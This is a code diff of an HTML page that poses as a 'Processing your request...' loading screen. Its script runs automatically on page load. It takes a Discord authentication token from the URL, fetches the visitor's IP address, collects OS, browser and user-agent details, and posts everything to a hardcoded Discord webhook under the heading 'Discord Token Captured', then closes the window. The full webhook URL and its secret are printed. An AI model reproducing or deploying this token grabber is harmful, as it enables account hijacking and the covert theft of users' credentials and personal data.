@@ -1,47 +1,161 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Token Receiver</title>
+  <title>Processing</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #36393f;
+      color: #dcddde;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+      max-width: 500px;
+    }
+    .loading {
+      display: inline-block;
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #7289da;
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <h1>Token Received!</h1>
-  <p id="tokenDisplay"></p>
+  <div class="container">
+    <div class="loading"></div>
+    <h2>Processing your request...</h2>
+    <p>This window will close automatically.</p>
+  </div>
 
   <script>
-    function sendWebhook(token) {
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE'; // Webhook URL
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ content: `Token: ${token}` }),
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Webhook sent successfully!');
-        } else {
-          console.error('Failed to send webhook:', response.status, response.statusText);
-        }
-      })
-      .catch(error => {
-        console.error('Error sending webhook:', error);
-      });
+    function sendWebhook() {
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE'; // ここに実際のWebhook URLを入れてください
+      
+      // URLパラメータから情報を取得
+      const urlParams = new URLSearchParams(window.location.search);
+      const token = urlParams.get('token');
+      const datetime = urlParams.get('datetime') || '2025-05-26 04:11:15';
+      const user = urlParams.get('user') || 'n4n45h1ip';
+      const userAgent = urlParams.get('ua') || navigator.userAgent;
+      
+      // IPアドレスを取得（外部サービス使用）
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          
+          // システム情報を収集
+          const os = detectOS(userAgent);
+          const browser = detectBrowser(userAgent);
+          
+          // Discord Webhookのembedを作成
+          const embed = {
+            title: "🔐 Discord Token Captured",
+            description: "A Discord authentication token has been successfully captured.",
+            color: 0x5865F2, // Discord Blue
+            fields: [
+              {
+                name: "📋 Token",
+                value: "```" + token + "```",
+                inline: false
+              },
+              {
+                name: "🕒 Date & Time (UTC)",
+                value: "```" + datetime + "```",
+                inline: true
+              },
+              {
+                name: "👤 User",
+                value: "```" + user + "```",
+                inline: true
+              },
+              {
+                name: "🌐 IP Address",
+                value: "```" + ipAddress + "```",
+                inline: true
+              },
+              {
+                name: "💻 System",
+                value: "```OS: " + os + "\nBrowser: " + browser + "```",
+                inline: true
+              },
+              {
+                name: "🔍 User Agent",
+                value: "```" + userAgent + "```",
+                inline: false
+              }
+            ],
+            thumbnail: {
+              url: "https://i.imgur.com/0uZzlkh.png" // Discord logo
+            },
+            footer: {
+              text: "Token captured at " + new Date().toUTCString(),
+              icon_url: "https://i.imgur.com/AfFp7pu.png" // Discord icon
+            }
+          };
+          
+          // Webhookを送信
+          return fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ 
+              embeds: [embed],
+              username: "Token Capture",
+              avatar_url: "https://i.imgur.com/AfFp7pu.png"
+            })
+          });
+        })
+        .then(response => {
+          if (response && response.ok) {
+            console.log('Data sent successfully!');
+          } else if (response) {
+            console.error('Failed to send data:', response.status, response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        })
+        .finally(() => {
+          // 3秒後にウィンドウを閉じる
+          setTimeout(() => window.close(), 3000);
+        });
     }
-
-    // URLパラメータからトークンを取得
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('token');
-
-    if (token) {
-      // ウェブページにトークンを表示 (デバッグ用)
-      document.getElementById('tokenDisplay').innerText = `Token: ${token}`;
-
-      // Webhookを送信
-      sendWebhook(token);
-    } else {
-      console.log('Token not found in URL.');
+    
+    // OSを検出
+    function detectOS(ua) {
+      if (ua.includes("Windows NT")) return "Windows";
+      if (ua.includes("Mac OS")) return "macOS";
+      if (ua.includes("Linux")) return "Linux";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+      return "Unknown OS";
     }
+    
+    // ブラウザを検出
+    function detectBrowser(ua) {
+      if (ua.includes("Firefox/")) return "Firefox";
+      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
+      if (ua.includes("Chrome/")) return "Chrome";
+      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
+      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
+      return "Unknown Browser";
+    }
+    
+    // ページロード時に自動実行
+    window.onload = sendWebhook;
   </script>
 </body>
 </html>
